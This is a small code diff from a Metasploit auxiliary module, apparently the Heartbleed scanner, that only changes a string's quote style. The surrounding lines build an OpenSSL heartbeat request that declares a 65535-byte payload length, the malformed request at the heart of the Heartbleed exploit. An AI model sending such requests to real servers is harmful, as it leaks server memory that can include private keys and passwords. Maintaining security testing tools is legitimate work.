@@ -410,7 +410,7 @@ class Metasploit3 < Msf::Auxiliary
   # Generates a heartbeat request
   def heartbeat_request(length)
     payload = "\x01"              # Heartbeat Message Type: Request (1)
-    payload << [length].pack("n") # Payload Length: 65535
+    payload << [length].pack('n') # Payload Length: 65535
 
     ssl_record(HEARTBEAT_RECORD_TYPE, payload)
   end
